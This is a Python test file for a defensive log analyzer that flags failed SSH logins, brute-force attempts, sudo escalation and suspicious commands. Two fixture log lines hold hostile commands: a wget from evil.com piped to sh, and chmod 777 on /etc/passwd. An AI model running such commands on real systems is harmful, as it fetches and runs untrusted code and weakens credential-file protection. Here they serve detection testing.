import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from log_analyzer import LogAnalyzer, generate_demo_log


class TestLogAnalyzer:
    def test_failed_login_detection(self):
        analyzer = LogAnalyzer()
        analyzer.parse_line("Jan 15 08:23:01 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2")
        assert len(analyzer.failed_logins) == 1
        assert analyzer.failed_login_ips["192.168.1.100"] == 1

    def test_successful_login_detection(self):
        analyzer = LogAnalyzer()
        analyzer.parse_line("Jan 15 08:25:00 server sshd[1247]: Accepted password for admin from 172.16.0.5 port 22 ssh2")
        assert len(analyzer.success_logins) == 1
        assert analyzer.success_login_ips["172.16.0.5"] == 1

    def test_privilege_escalation_detection(self):
        analyzer = LogAnalyzer()
        analyzer.parse_line("Jan 15 08:30:00 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash")
        assert len(analyzer.priv_escalations) == 1

    def test_suspicious_pattern_detection(self):
        analyzer = LogAnalyzer()
        analyzer.parse_line("Jan 15 08:40:00 server bash[5678]: wget http://evil.com/malware.sh | sh")
        assert len(analyzer.suspicious_events) == 1

    def test_brute_force_detection(self):
        analyzer = LogAnalyzer()
        for i in range(10):
            analyzer.parse_line(f"Jan 15 08:23:{i:02d} server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2")
        brute_force = analyzer.get_brute_force_ips(threshold=5)
        assert "192.168.1.100" in brute_force
        assert brute_force["192.168.1.100"] == 10

    def test_empty_line(self):
        analyzer = LogAnalyzer()
        analyzer.parse_line("")
        assert analyzer.total_lines == 1
        assert len(analyzer.failed_logins) == 0

    def test_report_generation(self):
        analyzer = LogAnalyzer()
        demo_data = generate_demo_log()
        for line in demo_data.splitlines():
            analyzer.parse_line(line)
        report = analyzer.generate_report()
        assert "LOG ANALYSIS SECURITY REPORT" in report
        assert "BRUTE FORCE DETECTED" in report
        assert "192.168.1.100" in report

    def test_analyze_file(self, tmp_path):
        log_file = tmp_path / "test.log"
        log_file.write_text("Jan 15 08:23:01 server sshd[1234]: Failed password for admin from 10.0.0.1 port 22 ssh2\n")
        analyzer = LogAnalyzer()
        analyzer.analyze_file(str(log_file))
        assert len(analyzer.failed_logins) == 1

    def test_multiple_failed_logins_same_ip(self):
        analyzer = LogAnalyzer()
        for i in range(5):
            analyzer.parse_line(f"Jan 15 08:23:{i:02d} server sshd[1234]: Failed password for admin from 10.0.0.99 port 22 ssh2")
        assert analyzer.failed_login_ips["10.0.0.99"] == 5

    def test_suspicious_chmod_pattern(self):
        analyzer = LogAnalyzer()
        analyzer.parse_line("kernel: chmod 777 /etc/passwd")
        assert len(analyzer.suspicious_events) == 1
        assert "permissions" in analyzer.suspicious_events[0]["description"].lower()
